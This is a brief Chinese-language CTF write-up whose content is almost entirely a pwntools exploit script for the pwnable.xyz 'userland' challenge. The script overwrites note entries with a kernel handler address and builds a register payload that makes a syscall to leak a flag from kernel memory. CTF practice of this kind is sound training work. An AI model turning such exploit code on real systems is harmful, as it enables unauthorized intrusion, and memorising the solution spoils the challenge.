### 描述

很简单的题，想复杂了



### 脚本

```python
from pwn import *

context(os='linux', arch='amd64')
context.terminal = ['tmux', 'splitw', '-h']

p = remote('svc.pwnable.xyz', 30048)
# p = process('./userland')


def editNote(ix, ct):
    p.sendlineafter(b'Exit\n', b'1')
    p.sendlineafter(b'id: ', str.encode(str(ix)))
    p.sendlineafter(b's: ', ct)


def showNote(ix):
    p.sendlineafter(b'Exit\n', b'2')
    p.sendlineafter(b'id: ', str.encode(str(ix)))


kernel_addr = 0xFFFFFFFF81000000
flag2_addr = kernel_addr + 0x5000
irq_handler_addr = kernel_addr + 0xf9
payload = p64(irq_handler_addr)
if b'\n' in payload:
    error('no newline!')
for i in range(9):
    editNote(i, payload)

# 打印flag
rax = 274858008       # jmp [0x??? + rax * 8] -> rip = node[8].node[0]
rdi = 0
rsi = flag2_addr
rdx = 32
syscall_addr = 0x4000338
payload = b'a' * 8         # padding
payload += p64(rax) + p64(rdi) + p64(rsi) + p64(rdx) + p64(syscall_addr)
if b'\n' in payload:
    error('no newline!')
editNote(9, payload)
showNote(0)

p.interactive()

```

